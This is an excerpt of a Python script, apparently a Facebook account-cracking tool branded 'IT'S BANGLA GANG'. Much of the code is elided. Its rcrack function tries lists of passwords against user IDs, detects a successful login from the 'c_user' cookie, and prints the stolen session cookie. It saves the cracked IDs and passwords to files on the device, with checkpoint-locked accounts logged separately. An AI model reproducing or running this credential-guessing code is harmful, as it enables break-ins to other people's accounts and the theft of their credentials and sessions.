...
logo =("""\033[1;32m                   
  ...
  ___ _____ _ ____    ______     ______ 
 |_ _|_   _( ) ___|  | __ ) \   / / ___|
  | |  | | |/\___ \  |  _ \\ \ / / |  _ 
  | |  | |    ___) | | |_) |\ V /| |_| |
 |___| |_|   |____/  |____/  \_/  \____|
       ...
       ┌━━━━━━━━━━━━━━━━━ IT'S BANGLA GANG  ━━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  IT’S BANGLA VAI        
               \033[1;91mFACEBOK         :  MOZAMMEL ISLAM               
               \033[1;97mGITHUB           : MOZAMMEL-404       
               \033[1;91mSTATUS          :   PREMIUM           
               \033[1;97mTEAM             :  IT'S BANGLA GANG               
               \033[1;91mTOOL VIRSION :  2.00                    
               \033[1;97mTOOL WORK    :   DATA & WIFI          
      \033[1;32m └━━━━━━━━━━━━━━━━━ IT’S BANGLA GANG  ━━━━━━━━━━━━━━━━┘""")
loop = 0
oks = []
cps = []
def linex():
...
try:
    ...
    open('.prox.txt','w').write(prox)
	  ...
	  print('WELCOME TO IT'S BANGLA GANG TOOLS')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\r\033[1;37m[MOZAMMEL\033[1;37m]  [%s/%s]  OK-%s'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[MOZAMMEL-OK] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/MOZAMMEL-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[MOZAMMEL-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/MOZAMMEL-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
